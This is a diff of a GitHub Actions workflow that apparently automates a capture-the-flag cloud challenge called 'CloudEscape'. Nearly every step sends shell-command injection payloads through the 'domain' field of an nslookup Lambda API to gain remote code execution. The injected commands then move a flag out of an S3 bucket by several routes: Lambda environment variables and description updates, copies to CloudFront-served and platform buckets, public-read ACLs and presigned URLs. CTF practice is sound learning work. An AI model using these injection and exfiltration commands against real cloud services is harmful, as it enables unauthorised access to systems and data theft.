@@ -1,4 +1,4 @@
-name: CloudEscape Stage 1 - Exfil Flag
+name: CloudEscape Stage 1 - Env Exfil
 on:
   workflow_dispatch:
   push:
@@ -18,105 +18,78 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      # ── 1. Inject command: copy flag to flag.txt on Lambda /tmp ──
-      # Then put it into Lambda env vars so we can read via get-function-configuration
-      - name: Trigger Lambda - Exfil via Env Vars
+      # ── Step 1: Simple test - can the Lambda's aws CLI list buckets? ──
+      # This writes to CloudWatch - we can't see it, but it confirms RCE
+      - name: Test 1 - Confirm RCE with simple commands
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # First: copy flag to /tmp and capture it, then update Lambda's own env vars
-          # The Lambda has aws_cli_layer so aws CLI is available at /opt/aws
-          # We need to find the aws binary path. Let's try /opt/aws/bin/aws or just aws
-          
-          echo "===== Attempt A: Exfil via Lambda env var update ====="
-          # First read the flag, then update this Lambda's own env
-          PAYLOAD='{"domain": "x; FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt 2>/dev/null && cat /tmp/f.txt | tr -d \"\\n\"); aws lambda update-function-configuration --function-name nslookupv2 --environment \"Variables={EXFIL=$FLAG}\" 2>&1"}'
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          
-          sleep 5
-
-          echo ""
-          echo "===== Read Lambda config for exfiltrated flag ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1 | jq '.Environment.Variables' 2>/dev/null || aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
-
-      # ── 2. Also try: copy flag to CloudFront-served site bucket ──
-      - name: Trigger Lambda - Exfil via CloudFront site bucket
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          echo "===== Attempt B: Copy flag to site bucket (CloudFront origin) ====="
+          echo "===== Simple echo test ====="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt"}' 2>&1
-          
+            -d '{"domain": "x; echo RCE_CONFIRMED > /tmp/rce.txt"}' 2>&1
+          sleep 2
+
+      # ── Step 2: Copy flag to /tmp, then update Lambda env in separate call ──
+      - name: Test 2 - Copy flag to /tmp
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          echo "===== Copy flag to /tmp ====="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
+            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt"}' 2>&1
+          sleep 3
+
+      # ── Step 3: Use a Python one-liner to update Lambda env ──
+      # The Lambda's timeout is 15s so we need fast commands
+      - name: Test 3 - Update env var with flag content
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          echo "===== Update Lambda env with flag ====="
+          # Try using the Lambda's own aws CLI to update its env
+          # The flag is in /tmp/flag.txt from step 2
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
+            -d '{"domain": "x; F=$(cat /tmp/flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --environment Variables={FLAG=$F}"}' 2>&1
           sleep 8
-          
-          echo ""
-          echo "===== Read flag via CloudFront ====="
-          curl -s "https://d67nf28gqfurd.cloudfront.net/flag.txt" 2>&1
 
-      # ── 3. Try: copy flag to platform bucket with different approaches ──
-      - name: Trigger Lambda - Exfil via platform bucket
+      # ── Step 4: Read the env var ──
+      - name: Test 4 - Read Lambda env
         run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          echo "===== Attempt C: Copy to platform bucket ====="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/f.txt"}' 2>&1
-          
-          sleep 5
-          
-          echo ""
-          echo "===== Read flag from platform bucket ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/f.txt" 2>&1
-
-      # ── 4. Try: use aws s3 presign to create a public URL ──
-      - name: Trigger Lambda - Presign URL approach
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          echo "===== Attempt D: Presign URL for flag ====="
-          # The Lambda might be able to generate a presigned URL for the flag
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 presign s3://codec4f26c862a321ef5/flag.txt --expires-in 3600 > /tmp/presign.txt; aws s3 cp /tmp/presign.txt s3://platform-bucket-009661764077-us-east-1/presign.txt"}' 2>&1
-          
-          sleep 5
-          
-          echo ""
-          echo "===== Read presigned URL from platform bucket ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/presign.txt" 2>&1
-
-      # ── 5. Try: Lambda can list what it sees and tell us via writing to platform bucket ──
-      - name: Trigger Lambda - List buckets and write to platform
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          echo "===== Attempt E: List S3 and exfil to platform bucket ====="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 ls > /tmp/ls.txt; aws s3 cp /tmp/ls.txt s3://platform-bucket-009661764077-us-east-1/ls.txt"}' 2>&1
-          
-          sleep 5
-          
-          echo ""
-          echo "===== Read ls.txt from platform bucket ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/ls.txt" 2>&1
-
-      # ── 6. Also try: write flag content to CloudFront site bucket as index.html override ──
-      - name: Trigger Lambda - Write flag as CloudFront index
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          echo "===== Attempt F: Write flag to site bucket as exfil.html ====="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
-            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/exfil.html"}' 2>&1
-          
-          sleep 8
-          
-          echo ""
-          echo "===== Read exfil.html via CloudFront ====="
-          curl -s "https://d67nf28gqfurd.cloudfront.net/exfil.html" 2>&1
-
-      # ── 7. Final check: Read Lambda env vars (in case any exfil worked) ──
-      - name: Final Lambda Config Check
-        run: |
-          echo "===== Final Lambda Config ====="
+          echo "===== Read Lambda config ====="
           aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
+
+      # ── Step 5: Try with a different approach - put flag in Lambda description ──
+      - name: Test 5 - Put flag in Lambda description
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          echo "===== Update Lambda description with flag ====="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
+            -d '{"domain": "x; F=$(cat /tmp/flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --description $F"}' 2>&1
+          sleep 8
+          echo "===== Read description ====="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' 2>&1
+
+      # ── Step 6: Try using S3 copy with the Lambda's own creds to write to codec bucket ──
+      - name: Test 6 - Write flag to codec bucket under new key
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          echo "===== Copy flag to new key in codec bucket ====="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
+            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/exfil.txt"}' 2>&1
+          sleep 5
+          echo "===== Try to read exfil.txt from codec bucket ====="
+          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1
+
+      # ── Step 7: Try writing flag to a public object via bucket ACL ──
+      - name: Test 7 - Copy flag and set public ACL
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          echo "===== Copy flag to platform bucket with public-read ACL ====="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
+            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/public_flag.txt --acl public-read"}' 2>&1
+          sleep 5
+          echo "===== Read public_flag.txt ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/public_flag.txt" 2>&1
+
+      # ── Step 8: If env var update worked, read it now ──
+      - name: Final env check
+        run: |
+          echo "===== Final Lambda config with env ====="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print('ENV:', d.get('Environment',{}).get('Variables',{})); print('DESC:', d.get('Description',''))" 2>&1 || aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
